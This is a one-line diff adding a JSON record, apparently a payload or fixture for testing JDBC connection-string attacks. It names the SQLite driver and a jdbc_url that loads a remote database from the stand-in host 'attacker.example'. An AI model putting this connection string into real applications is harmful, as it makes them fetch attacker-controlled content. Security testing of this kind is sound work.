@@ -1,0 +1,1 @@
+{"attack_type":"jdbc_connection","driver":"sqlite","driver_class":"org.sqlite.JDBC","jdbc_url":"jdbc:sqlite::resource:http://attacker.example/evil.db","url_params":{},"credentials":{"user":"","password":""},"pool":"","pool_config":{},"sql_payload":"","deser_properties":{}}
